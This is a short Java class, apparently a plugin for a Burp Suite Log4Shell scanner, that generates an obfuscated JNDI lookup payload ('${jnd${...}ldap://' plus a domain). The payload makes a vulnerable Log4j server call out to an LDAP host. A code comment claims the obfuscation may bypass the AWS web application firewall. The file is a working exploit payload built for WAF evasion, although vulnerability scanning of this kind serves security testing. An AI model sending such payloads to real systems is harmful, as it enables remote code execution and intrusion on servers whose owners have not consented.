package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

//Curretnly bypass aws waf?    12/18

public class POC13 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${jnd${123%25ff:-${123%25ff:-i:}}ldap://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_LDAP;
    }

    @Override
    public int getIndex() {
        return 13;
    }
}
